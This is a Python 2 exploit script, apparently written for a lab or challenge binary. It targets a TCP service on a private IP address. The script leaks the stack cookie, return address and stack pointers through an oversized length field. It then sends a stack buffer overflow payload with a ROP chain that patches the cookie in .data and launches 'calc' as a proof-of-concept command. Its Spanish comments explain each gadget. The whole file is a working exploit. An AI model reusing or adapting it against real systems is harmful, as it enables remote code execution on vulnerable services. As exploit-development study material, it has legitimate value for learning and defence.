import socket
import struct
# Miguel Méndez Zúñiga

set_size = 0x13660100
junk_size = 256

def connection():
    con = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    con.connect(("192.168.18.186", 55555))
    return con

def handshake(con):
    hand = 'Hello\x00'
    con.send(hand)
    con.recv(4)

def chunksize(con, size_chunk):
    chunk = struct.pack('<i', size_chunk)
    con.send(chunk)

def memleak():
    data = ''
    for i in range(56):
        con = connection()
        handshake(con)
        chunksize(con, set_size+i)

        if i == 0:
            payload = '_' * junk_size
        else:
            payload = '_' * (junk_size) + data

        con.send(payload)
        data += con.recv(1024)[-1:]
        print 'Mem: {}'.format(data.encode('hex'))

    mem_cookie = struct.unpack("<q", data[:8])[0]
    mem_return = struct.unpack("<q", data[24:32])[0]
    mem_sock = struct.unpack("<q", data[32:40])[0]
    mem_stack = struct.unpack("<q", data[48:56])[0]
    return '{}:{}:{}:{}'.format(mem_cookie, mem_return, mem_sock, mem_stack)

def bof(cookie, stack, base):
    rop_align = struct.pack('<q', base + 0x1A03)        # pop rbx / retn -> guarda la direccion de cookie data para que sea modificada
    rop_align += struct.pack('<q', base + 0x11cd8)      # ptr cookie .data
    rop_align += struct.pack('<q', base + 0x11AB)       # pop rax / retn -> guarda direccion de stack almacenada
    rop_align += struct.pack('<q', stack + 584)         # offset de rsp actual para el xor de cookie
    rop_align += struct.pack('<q', base + 0xBF0E)       # mov [rbx], rax / add rsp, 20h / pop rbx / retn -> se modifica cookie .data con valor de stack calculado
    rop_align += struct.pack('<q', base + 0x11AC) * 5   # retn compensar el desplazamiento de add rsp, 20h
    rop_cmd = rop_align
    rop_cmd += struct.pack('<q', base + 0x11AB)         # pop rax / ret
    rop_cmd += struct.pack('<q', 0x100)                 # size que sera multiplicado por 8 para el desplazamiento en el array hacia cmd
    rop_cmd += struct.pack('<q', base + 0x1388)         # array de A's

    payload = 'a' * junk_size
    payload += struct.pack('<q', cookie) 
    payload += '_' * 16
    payload += rop_cmd
    payload += 'b' * 64
    payload += 'calc\x00'
    payload += '\x00' * 275                             # compensacion de bytes para retornar a exit() 
    payload += struct.pack('<q', base + 0x2E38)         # exit()

    con = connection()
    handshake(con)
    chunksize(con, (set_size-0x100)+len(payload))

    con.send(payload)

if __name__ == '__main__':
    leakies = memleak()
    cookie = int(leakies.split(':')[0])
    eip = int(leakies.split(':')[1])
    sock = int(leakies.split(':')[2])
    stack = int(leakies.split(':')[3])
    base = eip - 0x16f0

    print('* Leak Cookie: {}'.format(hex(cookie)))
    print('* Leak Ret eip: {}'.format(hex(eip)))
    print('* Leak Sock: {}'.format(hex(sock)))
    print('* Leak Stack: {}'.format(hex(stack)))
    print('* Base Address: {}'.format(hex(base)))
    bof(cookie, stack, base)
